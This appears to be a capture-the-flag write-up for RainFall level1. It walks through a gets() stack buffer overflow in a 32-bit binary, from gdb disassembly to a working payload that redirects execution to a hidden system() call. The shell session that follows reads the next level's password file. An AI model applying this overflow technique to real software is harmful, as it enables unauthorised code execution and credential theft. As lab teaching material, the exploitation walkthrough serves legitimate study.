## Level 1

### Vulnerability Analysis
The target here is `level1`. Running it directly pauses for user input. We can exit this with `^C`.
To understand the binary, we use `gdb -q ./level1` and inspect the program's defined functions with `info functions`. This reveals a very interesting non-standard function called `run` located at `0x08048444`.

We also run `disas main` to see the program's entry point.
The assembly shows:
```assembly
0x08048486 <+6>:     sub    $0x50,%esp
0x08048489 <+9>:     lea    0x10(%esp),%eax
...
0x08048490 <+16>:    call   0x8048340 <gets@plt>
```
The `main` function allocates `0x50` (80 bytes) on the stack, and places the user's input (starting at `esp + 0x10`) directly into a buffer using `gets()`. Because `gets()` performs no bounds checking, it is inherently vulnerable to a buffer overflow. If we provide input larger than the buffer, we can overwrite adjacent data on the stack, including the saved Base Pointer (EBP) and the Instruction Pointer (EIP).

Next, we run `disas run` to examine the unused function:
```assembly
0x08048444 <+0>:     push   %ebp
...
0x08048479 <+53>:    call   0x8048360 <system@plt>
```
The `run` function makes a call to `system()` (presumably with `/bin/sh` or a similar string). Its memory address is `0x08048444`. 

### The Exploit
Our goal is to overflow the buffer in `main` so that we overwrite the saved EIP with the address of `run` (`0x08048444`). 
To find the exact offset required to reach the EIP, we can pass a pattern of characters into `gets()` via GDB. We guessed an offset of 76 bytes, and appended 4 'B's:
```bash
(gdb) run < <(python -c 'print "A" * 76 + "B" * 4')
```
GDB responds with a crash at `0x42424242` (`B` is 0x42 in hexadecimal). This confirms that exactly 76 bytes of padding are needed to reach the saved instruction pointer.

Because the system is 32-bit and uses little-endian byte ordering, the target address `0x08048444` must be written backwards as `\x44\x84\x04\x08`. We can use python to generate the payload, pipe it to `cat` to keep stdin open, and pipe both into `./level1`.

```bash
level1@RainFall:~$ (python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
*(Note: Piping `cat` without arguments forces standard input to stay open so we can interact with the bash shell spawned by the `run` method.)*
